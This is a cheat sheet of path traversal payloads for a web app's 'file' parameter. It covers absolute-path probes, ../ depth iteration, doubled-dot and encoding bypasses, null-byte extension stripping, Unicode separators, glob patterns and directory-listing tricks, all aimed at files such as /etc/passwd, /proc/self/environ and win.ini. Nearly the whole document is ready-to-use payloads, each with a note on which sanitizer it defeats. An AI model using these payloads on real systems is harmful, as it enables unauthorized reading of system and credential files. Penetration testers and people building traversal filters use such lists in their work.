# Traversal Variants — every `..` form

## The absolute-path-first rule — always probe absolute first

```
?file=/etc/passwd
?file=/etc/hostname
?file=/proc/self/environ
?file=c:/windows/win.ini
?file=c:\windows\win.ini
?file=\\.\c:\windows\win.ini
```

Many apps `os.path.join(base, input)` — an absolute input replaces the
base — no traversal needed. Absolute-first separates "the param reaches
fs" from "the traversal syntax is right".

## The bare `../` family — the classic

```
?file=../etc/passwd
?file=../../etc/passwd
?file=../../../etc/passwd
?file=../../../../etc/passwd
?file=../../../../../etc/passwd
?file=../../../../../../etc/passwd
?file=../../../../../../../etc/passwd
?file=../../../../../../../../etc/passwd
?file=../../../../../../../../../etc/passwd
```

Depth 1-9 — the count depends on the base dir's depth — iterate.

## The `....`/`....//` doubled-dot — strip-`..`-once bypass

```
?file=....//etc/passwd
?file=....//....//etc/passwd
?file=....//....//....//etc/passwd
?file=....\/etc/passwd
?file=....\/....\/etc/passwd
```

A sanitizer that strips `..` once — `....//` → `../` after the strip —
the doubled form.

## The `..;/`/`..;` — semicolon variant

```
?file=..;/etc/passwd
?file=..;/
```

`;` is a path-separator on some systems — a `..`+`;` variant.

## The backslash family — Windows-style

```
?file=..\etc\passwd
?file=..\..\etc\passwd
?file=..\..\..\etc\passwd
?file=..\..\..\..\etc\passwd
?file=..\..\..\..\..\etc\passwd
?file=..\\..\\..\\etc\\passwd
?file=..%5c..%5c..%5cetc%5cpasswd
```

`\` is a path-separator on Windows — and on some Linux apps that
normalize it — the backslash form.

## The URL-encoded forms — per layer

```
%2e%2e%2f                     — ../
%252e%252e%252f               — double-encoded ../
%252e%252e%255c               — double-encoded ..\
%2e%2e%5c                     — ..\
%2e%2e/                       — ../
..%2f                         — ../
%2e%2e%2f                     — ../
..%252f                       — ../ double-encoded
..%c0%af                      — ../ overlong UTF-8
..%e0%80%af                   — ../ triple-overlong
..%ef%bc%8f                   — ../ fullwidth
..%u2215                      — ../ unicode-divide
..%uFF0F                      — ../ fullwidth
```

## The null-byte terminator — `%00`

```
?file=/etc/passwd%00
?file=/etc/passwd%00.php
?file=/etc/passwd%00.png
?file=/etc/passwd%00.html
?file=/etc/passwd%2500
?file=/etc/passwd%00..%2f
?file=/etc/passwd%00%2f..%2f
```

`%00` terminates the string before an appended extension — the classic
`.php`-append bypass — works on PHP < 5.3.4 and some CFM/Java.

## The extension-strip — when `.php` is added

```
?file=/etc/passwd%00           — terminates before .php
?file=/etc/passwd%00.php       — the .php after %00 is dead
?file=/etc/passwd/./           — ./ normalizes to nothing after
?file=/etc/passwd/../..        — traverse-out-traverse-in
?file=/etc/passwd%2f..%2f
```

## The path-normalization tricks — `..` without `..`

```
?file=/etc/../etc/passwd         — traverse-out-traverse-in
?file=/etc/./passwd              — ./ is identity
?file=/./etc/passwd
?file=/etc/passwd/../passwd      — down-one-up-one
?file=/etc//passwd               — double-slash collapses
?file=/etc\passwd                — backslash normalize
?file=/etc%5cpasswd
?file=/etc/passwd/               — trailing slash
?file=//etc/passwd               — leading double-slash
?file=//./etc/passwd
```

## The `..`-only-with-slash — the missing-slash trick

```
?file=..%2fetc%2fpasswd          — ../etc/passwd
?file=%2e%2e%2fetc%2fpasswd      — ../etc/passwd
?file=%2e%2e/etc/passwd          — ../
```

## The case-trick — `..`/`..`/`..` on case-insensitive normalize

```
?file=..%2F..%2Fetc%2Fpasswd     — %2F vs %2f
```

## The Unicode-exotic — `…`/`︰`/`／`/`＼`

```
?file=..%ef%bc%8fetc             — ／
?file=..%ef%bc%bcetc             — ＼
?file=..%e2%80%a6etc             — …
?file=..%uFF0Fetc                — ／ (uFF0F)
?file=..%u2215etc                — ∕ (u2215)
?file=..%u2216etc                — ∖ (u2216)
?file=..%u2571etc                — ╱ (u2571)
?file=..%u29F8etc                — ⧸ (u29F8)
```

The fullwidth/halfwidth Unicode separators — a normalize-only-ASCII
sanitizer misses them.

## The wildcard/glob — when the param feeds glob

```
?file=/etc/passwd*               — glob-match
?file=/etc/pas?wd                — ? glob
?file=/etc/[a-z]*                — bracket glob
?file=/proc/*/environ            — * glob
```

If the param feeds a glob (`glob()`/`os.listdir`-match) — the wildcard
is a valid path — read by pattern.

## The "the path is built weird" — concat-confusion

```
?file=.        — reads the base dir itself — a directory-listing oracle
?file=./       — same
?file=../      — parent dir — a dir-listing oracle
?file=/        — root — dir-listing
?file=...      — not .. — the literal file "..."
?file=....     — literal "...."
```

`?file=.` reads the base dir — a listing oracle — reveals the files
inside.
